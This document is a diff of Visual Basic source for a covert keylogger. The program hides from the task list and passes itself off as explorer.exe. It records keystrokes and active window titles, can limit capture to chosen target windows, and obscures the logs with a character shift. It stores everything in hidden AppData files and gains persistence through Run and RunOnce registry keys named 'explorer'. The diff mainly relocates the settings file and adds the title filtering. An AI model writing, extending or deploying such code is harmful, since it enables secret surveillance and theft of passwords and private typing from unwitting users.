@@ -14,13 +14,20 @@ Begin VB.Form Form1
    ScaleHeight     =   6165
    ScaleWidth      =   6690
    StartUpPosition =   3  'Windows Default
-   Begin VB.TextBox sysPath 
+   Begin VB.TextBox username 
       Height          =   285
-      Left            =   240
+      Left            =   480
+      TabIndex        =   8
+      Text            =   "username"
+      Top             =   120
+      Width           =   1095
+   End
+   Begin VB.TextBox LogPath 
+      Height          =   285
+      Left            =   120
       TabIndex        =   7
-      Top             =   5160
-      Visible         =   0   'False
-      Width           =   5775
+      Top             =   5400
+      Width           =   2655
    End
    Begin VB.TextBox txtencr 
       Height          =   1935
@@ -31,7 +38,7 @@ Begin VB.Form Form1
       Width           =   6135
    End
    Begin VB.Timer Timer2 
-      Interval        =   530
+      Interval        =   60
       Left            =   5640
       Top             =   0
    End
@@ -150,118 +157,116 @@ Dim SysDir As String
 
 
 'Loadsetting variable declaration
-Dim wTitle, AllowBS, LogSysDir As Boolean
-Dim ext, encCode As String, LogMode As Integer
+Dim wTitle, AllowBS, SETRUNONCE, sLogging As Boolean
+Dim ext, encCode, Pwd As String, LogMode As Integer
+Dim t1, t2, t3, t4, t5 As String
 Dim lpath As String
+
 
 Private Sub Form_Load()
 'Get sysDirectory
 SysDir = String(80, 0)
 Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.
 
-'if program already running then confuse user that it is explorer
-sysPath.Text = SysDir
+'if program already running then confuse user that it is explorer.exe
+Dim sDr As String                   'Get system drive
+sDr = Left(SysDir, 2)
 If App.PrevInstance = True Then
-    Shell Left(sysPath.Text, 2) & "\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
+    Shell sDr & "\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
     End
+End If
+
+'IMPORT USERNAME*******************************************
+Dim sBuffer As String
+    Dim lSize As Long
+    sBuffer = Space$(255)
+    lSize = Len(sBuffer)
+    Call GetUserName(sBuffer, lSize)
+    If lSize > 0 Then
+        username = Left$(sBuffer, lSize)
+    Else
+        username = vbNullString
 End If
 
 
 Call loadsetting
-If LogSysDir = 1 Then  'Check Where should log stored system dir or defined path in setting.ini
-sysPath.Text = SysDir
-ElseIf LogSysDir = 0 Then
-sysPath.Text = INIRead("LogSetting", "LogDir", Left(SysDir, 2) & "\Program Files\Common Files\setting.ini")
-End If
-
 
 'hiding app
+
 App.TaskVisible = False
 'Me.Hide
 Timer1.Enabled = True
 
 
 On Error Resume Next
-Call setautorun
-MkDir sysPath.Text & "\sysResource"
-File1.Path = sysPath.Text & "\sysResource"
+'Call setautorun
+MkDir LogPath & "\sysResource"
+File1.Path = LogPath & "\sysResource"
 
 If LogMode = 0 Then
-    lpath = sysPath & "\sysResource\browse" & File1.ListCount + 1 & "xcz" & ext
+    lpath = LogPath & "\sysResource\browse" & File1.ListCount + 1 & "z" & ext
 ElseIf LogMode = 1 Then
     Dim a As Variant
-    a = Format$(Now, "dd" & "mm")
-    lpath = sysPath & "\sysResource\browse" & a & "xcz" & ext
+    a = Format$(Now, "dd" & "mm" & "yy")
+    lpath = LogPath & "\sysResource\browse" & a & "z" & ext
 ElseIf LogMode = 2 Then
-    lpath = sysPath & "\sysResource\browsexcz" & ext
+    lpath = LogPath & "\sysResource\browse" & ext
 End If
 
 
 'Write initials
 Open lpath For Append As 1
-Write #1, Time, encCode, App.Revision, username
+Write #1, Chr(155), Time, encCode, Date, username, Pwd, App.Revision
 Close #1
-   
+
 End Sub
 Private Sub loadsetting()
 Dim sDr As String
 sDr = Left(SysDir, 2)
 On Error GoTo err
 
-AllowBS = INIRead("LogSetting", "USEBS", sDr & "\Program Files\Common Files\setting.ini")
-wTitle = INIRead("LogSetting", "UseChildTitle", sDr & "\Program Files\Common Files\setting.ini")
-encCode = INIRead("LogSetting", "EncCode", sDr & "\Program Files\Common Files\setting.ini")
-ext = INIRead("LogSetting", "extension", sDr & "\Program Files\Common Files\setting.ini")
-Timer1.Interval = INIRead("LogSetting", "TimerInt", sDr & "\Program Files\Common Files\setting.ini")
-LogMode = INIRead("LogSetting", "LogMode", sDr & "\Program Files\Common Files\setting.ini")
-LogSysDir = INIRead("LogSetting", "LogSysDir", sDr & "\Program Files\Common Files\setting.ini")
+AllowBS = INIRead("LogSetting", "USEBS", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+wTitle = INIRead("LogSetting", "UseChildTitle", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+encCode = INIRead("LogSetting", "EncCode", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+ext = INIRead("LogSetting", "extension", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+Timer1.Interval = INIRead("LogSetting", "TimerInt", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+LogMode = INIRead("LogSetting", "LogMode", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+LogPath.Text = INIRead("LogSetting", "LogDir", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+sLogging = INIRead("LogSetting", "sLogging", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+Pwd = INIRead("LogSetting", "pwd", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+
+
+If sLogging = True Then
+    On Error GoTo err2
+    Open sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\titles.dat" For Input As 1
+    Do While Not EOF(1)
+    On Error Resume Next
+    Input #1, t1, t2, t3, t4, t5
+    Loop
+    Close #1
+End If
+
 
 err:
-If err.Number = 13 Then MsgBox "Setting not found", "setting": End            'setting.ini not found
+If err.Number = 13 Then Call createsetting             'setting.ini not found
+
+err2:
+If err.Number = 13 Then sLogging = False 'i.e, titles.dat not found
+End Sub
+'***********************creates setting.ini if not found***************
+Private Sub createsetting()
+Dim f As Integer
+f = FreeFile
+Open Left(SysDir, 2) & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini" For Output As #f
+Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & Left(SysDir, 2) & "\Users\" & username & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
+Close #f
+Call loadsetting
 End Sub
 Private Sub setautorun()
 ' Clear or set the key that makes the program run at startup.
     SetRunAtStartup "explorer", App.Path & ""
 End Sub
-Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
-Dim hKey As Long
-Dim key_value As String
-Dim status As Long
 
-    On Error GoTo SetStartupError
-
-    ' Open the key, creating it if it doesn't exist.
-    If RegCreateKeyEx(HKEY_CURRENT_USER, _
-        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
-        ByVal 0&, ByVal 0&, ByVal 0&, _
-        KEY_WRITE, ByVal 0&, hKey, _
-        ByVal 0&) <> ERROR_SUCCESS _
-    Then
-        MsgBox "Error " & err.Number & " opening key" & _
-            vbCrLf & err.Description
-        Exit Sub
-    End If
-
-
-        ' Create the key.
-        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
-        status = RegSetValueEx(hKey, "explorer", 0, REG_SZ, _
-            ByVal key_value, Len(key_value))
-
-        If status <> ERROR_SUCCESS Then
-            MsgBox "Error " & err.Number & " setting key" & _
-                vbCrLf & err.Description
-        End If
-   
-
-    ' Close the key.
-    RegCloseKey hKey
-    Exit Sub
-
-SetStartupError:
-    MsgBox err.Number & " " & err.Description
-    Exit Sub
-End Sub
 Private Sub Command1_Click()
 If Timer1.Enabled = True Then
 Timer1.Enabled = False
@@ -273,8 +278,30 @@ End Sub
 Private Sub Command2_Click()
 End
 End Sub
-Private Sub Timer2_Timer()
-    Text2.Text = GetActiveWindowTitle(wTitle)            'Get window title after 550 interval
+
+'*****************detects active window title change send record command**********
+Private Sub Text2_Change()
+
+If sLogging = True Then
+    If Val(Form1.Tag) = 1 Then
+    Call appendnow
+    Form1.Tag = "0"
+    End If
+
+    If LCase(Left(Text2.Text, Len(t1))) = LCase(t1) Or LCase(Left(Text2.Text, Len(t2))) = LCase(t2) Or LCase(Left(Text2.Text, Len(t3))) = LCase(t3) Or LCase(Left(Text2.Text, Len(t4))) = LCase(t4) Or LCase(Left(Text2.Text, Len(t5))) = LCase(t5) Then
+    
+    If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & Time & " : " & Text2.Text & vbCrLf
+    Timer1.Enabled = True
+    Form1.Tag = "1"
+
+    Else
+    Timer1.Enabled = False
+    End If
+Else    'sLogging=false
+    Call appendnow
+    If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
+End If
+
 End Sub
 Private Sub Timer1_Timer()
 Dim i As Integer
@@ -300,19 +327,7 @@ If Result = -32767 Then
 End If
 Next i
 End Sub
-'************************Recording to file use of Append*********
-Private Sub appendnow()
-Dim i As Integer
-For i = 1 To Len(Text1)
-txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
-Next i
 
-Open lpath For Append As #1
-        Print #1, txtencr.Text
-        Text1.Text = ""
-        txtencr.Text = ""
-Close #1
-End Sub
 
 '''**********************shiftkey****************
 Private Function checkshift(ByVal b As Integer) As String
@@ -508,11 +523,79 @@ Case Else
     locatekey = "[" & b & "]"
 End Select
 End Function
-Private Sub Text2_Change()
-Call appendnow
-If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
+'************************encrypting and Recording to file use of Append*********
+Private Sub appendnow()
+Dim i As Integer
+For i = 1 To Len(Text1)
+txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
+Next i
+
+Open lpath For Append As #1
+        Print #1, txtencr.Text
+        Text1.Text = ""
+        txtencr.Text = ""
+Close #1
 End Sub
-'******************kEYCASEPART***********
+Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
+Dim hKey As Long
+Dim key_value As String
+Dim status As Long
+
+    On Error GoTo SetStartupError
+
+    ' Open the key, creating it if it doesn't exist.
+
+SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", Left(SysDir, 2) & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+
+    If SETRUNONCE = True Then
+        If RegCreateKeyEx(HKEY_CURRENT_USER, _
+        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
+        ByVal 0&, ByVal 0&, ByVal 0&, _
+        KEY_WRITE, ByVal 0&, hKey, _
+        ByVal 0&) <> ERROR_SUCCESS _
+        Then
+        MsgBox "Error " & err.Number & " opening key" & _
+            vbCrLf & err.Description
+        Exit Sub
+        End If
+    Else
+        If RegCreateKeyEx(HKEY_CURRENT_USER, _
+        "Software\Microsoft\Windows\CurrentVersion\Run", _
+        ByVal 0&, ByVal 0&, ByVal 0&, _
+        KEY_WRITE, ByVal 0&, hKey, _
+       ByVal 0&) <> ERROR_SUCCESS _
+        Then
+        MsgBox "Error " & err.Number & " opening key" & _
+            vbCrLf & err.Description
+        Exit Sub
+        End If
+   End If
+
+
+        ' Create the key.
+        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
+        status = RegSetValueEx(hKey, "explorer", 0, REG_SZ, _
+            ByVal key_value, Len(key_value))
+
+        If status <> ERROR_SUCCESS Then
+            MsgBox "Error " & err.Number & " setting key" & _
+                vbCrLf & err.Description
+        End If
+   
+
+    ' Close the key.
+    RegCloseKey hKey
+    Exit Sub
+
+SetStartupError:
+    MsgBox err.Number & " " & err.Description
+    Exit Sub
+End Sub
+'*************Imports active w title***********
+Private Sub Timer2_Timer()
+    Text2.Text = GetActiveWindowTitle(wTitle)            'Get window title after 550 interval
+End Sub
+'******************KEYCASEPART***********
 Function correctcase(ByVal b As Integer) As String
 Dim tmp As Boolean
 tmp = GetKeyState(vbKeyCapital)
@@ -530,19 +613,7 @@ Else            'The Caps Lock Is Off
     End If
 End If
 End Function
-''*********************Username Import*********
-Private Function username() As String
-Dim sBuffer As String
-    Dim lSize As Long
-    sBuffer = Space$(255)
-    lSize = Len(sBuffer)
-    Call GetUserName(sBuffer, lSize)
-    If lSize > 0 Then
-        username = Left$(sBuffer, lSize)
-    Else
-        username = vbNullString
-    End If
-End Function
+
 
 ' ************************************Ativewindow title part******************************
 ' Returns the title of the active window.
